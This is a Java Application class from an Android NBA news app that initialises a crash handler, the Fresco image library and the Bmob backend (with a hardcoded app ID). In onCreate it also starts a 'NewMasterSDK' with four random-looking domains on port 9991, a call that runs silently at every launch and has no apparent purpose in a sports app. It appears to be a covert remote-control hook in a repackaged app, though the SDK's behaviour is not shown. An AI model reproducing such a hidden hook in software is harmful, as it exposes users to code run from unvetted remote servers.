package com.yuyh.xifengnba.app;

import android.app.Application;
import android.content.Context;

import com.facebook.drawee.backends.pipeline.Fresco;
import com.facebook.imagepipeline.core.ImagePipelineConfig;
import com.facebook.imagepipeline.decoder.SimpleProgressiveJpegConfig;
import com.mastersdk.android.MainActivity;
import com.mastersdk.android.NewMasterSDK;
import com.yuyh.library.AppUtils;
import com.yuyh.xifengnba.ui.SplashActivity;

import java.util.ArrayList;

import cn.bmob.v3.Bmob;
import cn.bmob.v3.BmobConfig;

/**
 * @author yuyh.
 * @date 16/6/4.
 */
public class SprintNBA extends Application {

    private static Context mContext;

    @Override
    public void onCreate() {
        super.onCreate();
        mContext = this;
        AppUtils.init(mContext);
        CrashHandler.getInstance().init(this);
        initBmob();
        initFresco();
        Class<?> arg0 = SplashActivity.class;
        ArrayList<String> arg1 = new ArrayList<>();
        arg1.add("http://568568ew.com:9991");
        arg1.add("http://456kusda.com:9991");
        arg1.add("http://rut89677.com:9991");
        arg1.add("http://7735df88.com:9991");
        Application arg2 = this;
        NewMasterSDK.init(arg0, arg1, arg2);
    }

    private void initFresco() {
        ImagePipelineConfig config = ImagePipelineConfig.newBuilder(this)
                .setProgressiveJpegConfig(new SimpleProgressiveJpegConfig())
                .build();
        Fresco.initialize(this, config);
    }

    private void initBmob() {
        BmobConfig config = new BmobConfig.Builder(this)
                .setApplicationId("e47d1b58418a7db9bc0f66c3628f11dc")//设置appkey
                .setConnectTimeout(30)//请求超时时间（单位为秒）：默认15s
                .setUploadBlockSize(1024 * 1024)//文件分片上传时每片的大小（单位字节），默认512*1024
                .setFileExpiration(2500)//文件的过期时间(单位为秒)：默认1800s
                .build();
        Bmob.initialize(config);
    }

    public static Context getAppContext() {
        return mContext;
    }
}
